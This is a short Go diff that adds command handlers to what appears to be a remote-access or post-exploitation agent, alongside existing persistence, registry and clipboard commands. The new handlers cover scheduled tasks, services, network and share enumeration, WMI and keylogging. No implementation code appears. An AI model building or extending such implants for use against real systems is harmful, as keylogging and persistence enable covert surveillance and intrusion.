@@ -64,6 +64,12 @@ func Initialize() {
 		RegisterCommand(&RegWriteCommand{})
 		RegisterCommand(&ClipboardCommand{})
 		RegisterCommand(&PersistCommand{})
+		RegisterCommand(&SchtaskCommand{})
+		RegisterCommand(&ServiceCommand{})
+		RegisterCommand(&NetEnumCommand{})
+		RegisterCommand(&NetSharesCommand{})
+		RegisterCommand(&WmiCommand{})
+		RegisterCommand(&KeylogCommand{})
 	}
 
 	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
